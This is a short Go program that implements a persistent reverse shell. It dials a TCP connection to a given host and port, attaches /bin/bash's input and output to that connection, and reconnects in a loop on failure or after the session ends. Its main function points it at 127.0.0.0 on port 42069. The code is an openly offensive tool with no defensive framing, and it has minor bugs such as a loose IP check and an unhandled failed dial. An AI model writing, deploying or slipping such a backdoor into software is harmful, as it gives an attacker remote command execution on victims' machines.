package main

import ( 
	"fmt"
	"net"
	"time"
	"strconv"
	"os/exec"
)

func check_ip(host string) bool {
	ip := split(host, '.')
	count := 0
	for x := 0; x < len(ip); x++ {
		if len(ip) != 4 {
        		count++
        		break
            	}

		tmp := 0
        	tmp, err := strconv.Atoi(ip[x])
        	if err != nil {
        		panic(err)
        		fmt.Println("la valeur entrée n'est pas la bonne")
        		break
        	}
        	if (x == 0 && tmp <= 0 || tmp > 256) || (tmp < 0 || tmp > 256) {
        		count++
        	}
        }
	if count == 0 {
		return true
	} else {
		return false
	}
}

func split(tosplit string, sep rune) []string {
	//string splitting function

	var fields []string
	last := 0
	
	for i,c := range tosplit {
        	if c == sep {
        	// Found the separator, append a slice
        	fields = append(fields, string(tosplit[last:i]))
        	last = i + 1
		}
	}

	// Don't forget the last field
	fields = append(fields, string(tosplit[last:]))

	return fields
}

func reverse_shell(host string, port string) string {
	value_port, _ := strconv.Atoi(port)
	if value_port <= 1 || value_port > 65536 {
		return "Port is wrong"
	}
	if check_ip(host) == false {
		return "Ip is wrong"
	}
	connection, err := net.Dial("tcp", host+":"+port)
	if nil != err {
		time.Sleep(5 * time.Second)
		reverse_shell(host, port)
	}

	//Use /bin/sh
	cmd := exec.Command("/bin/bash")

	//Get user command
	cmd.Stdin, cmd.Stdout, cmd.Stderr = connection, connection, connection

	//Launch user command and send user command output
	cmd.Run()
	
	//Close connection
	connection.Close()
	
	return reverse_shell(host, port)
}

func main() {
	fmt.Println(reverse_shell("127.0.0.0", "42069"))
}
